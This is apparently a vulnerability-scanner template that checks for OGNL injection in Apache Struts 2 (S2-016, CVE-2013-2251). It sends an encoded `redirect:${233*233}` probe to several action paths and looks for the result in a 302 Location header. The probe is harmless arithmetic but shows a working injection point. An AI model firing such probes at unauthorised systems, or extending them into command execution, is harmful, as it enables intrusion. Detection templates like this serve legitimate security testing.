id: local-struts2-s2-016-math

info:
  name: Struts2 S2-016 OGNL Injection Safe Math Probe (CVE-2013-2251)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-016 allows OGNL injection via the redirect: prefix
    in URL parameters (CVE-2013-2251). Safe probe evaluates 233*233=54289;
    result appears in the Location response header as a redirect target.
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-016
    - https://nvd.nist.gov/vuln/detail/CVE-2013-2251
  tags: safe-poc,struts2,s2-016,cve,cve2013,ognl,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}?redirect:%24%7B233*233%7D"
      - "{{BaseURL}}/index.action?redirect:%24%7B233*233%7D"
      - "{{BaseURL}}/login.action?redirect:%24%7B233*233%7D"
      - "{{BaseURL}}/user/login.action?redirect:%24%7B233*233%7D"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "54289"
      - type: status
        status:
          - 302
